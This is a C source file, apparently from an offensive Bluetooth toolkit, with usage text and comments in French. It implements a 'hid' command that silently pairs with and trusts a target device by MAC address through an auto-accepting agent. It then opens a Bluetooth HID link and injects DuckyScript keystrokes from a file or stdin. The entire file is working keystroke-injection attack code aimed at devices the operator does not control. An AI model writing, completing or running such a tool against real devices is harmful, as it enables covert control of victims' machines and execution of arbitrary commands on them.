#include <time.h>
#include <time.h>
#include "hid_cmd.h"
#include "hid.h"
#include "ducky.h"
#include "bluez.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

static void usage(const char *p)
{
    fprintf(stderr,
        "usage: %s hid -t <MAC> [-i hciX] [-f script.txt] "
        "[-d ms] [-n] [--no-pair]\n"
        "  -t <MAC>   cible\n"
        "  -i <hciX>  adaptateur (défaut hci0)\n"
        "  -f <file>  script DuckyScript (défaut stdin)\n"
        "  -d <ms>    délai après connexion (défaut 1000)\n"
        "  -n         pas d'agent d'appairage\n"
        "  --no-pair  ne pas (re)pairer, connexion directe\n", p);
}

int hid_cmd_run(int argc, char **argv)
{
    const char *adapter = "hci0", *target = NULL, *file = NULL;
    int delay_ms = 1000, no_agent = 0, no_pair = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-t") && i + 1 < argc)       target = argv[++i];
        else if (!strcmp(argv[i], "-i") && i + 1 < argc)  adapter = argv[++i];
        else if (!strcmp(argv[i], "-f") && i + 1 < argc)  file = argv[++i];
        else if (!strcmp(argv[i], "-d") && i + 1 < argc)  delay_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-n"))                  no_agent = 1;
        else if (!strcmp(argv[i], "--no-pair"))           no_pair = 1;
        else { usage("hid"); return 2; }
    }
    if (!target) { usage("hid"); return 2; }

    int hci = hci_devid(adapter);
    if (hci < 0) {
        fprintf(stderr, "hid: adaptateur %s introuvable\n", adapter);
        return 1;
    }

    /* 1. Agent auto-acceptant (fork ; le fils sert D-Bus) */
    pid_t agent = 0;
    if (!no_agent && bluez_agent_start(adapter, &agent) < 0)
        fprintf(stderr, "hid: agent non démarré (on continue)\n");

    int rc = 1;
    hid_t hid;

    /* 2. Pair + trust (l'agent accepte silencieusement) */
    if (!no_pair) {
        if (bluez_device_discover(adapter, target) < 0)
            fprintf(stderr, "hid: cible non decouverte (on tente quand meme)\n");
        bluez_device_remove(adapter, target);
        if (bluez_device_pair(adapter, target) < 0) {
            fprintf(stderr, "hid: appairage échoué\n");
            goto out;
        }
        bluez_device_trust(adapter, target);
    }

    /* 3. Transport HID */
    if (hid_open(&hid, hci, target) < 0)
        goto out;

    struct timespec ts = { .tv_sec = delay_ms / 1000,
                           .tv_nsec = (delay_ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);

    /* 4. Injection */
    {
        FILE *f = file ? fopen(file, "r") : stdin;
        if (!f) {
            fprintf(stderr, "hid: %s: %s\n", file, strerror(errno));
            hid_close(&hid);
            goto out;
        }
        int n = ducky_run(f, hid_sink, &hid);
        fprintf(stderr, "hid: %d événements injectés\n", n);
        if (file) fclose(f);
    }
    hid_close(&hid);
    rc = 0;

out:
    bluez_agent_stop(agent);
    return rc;
}
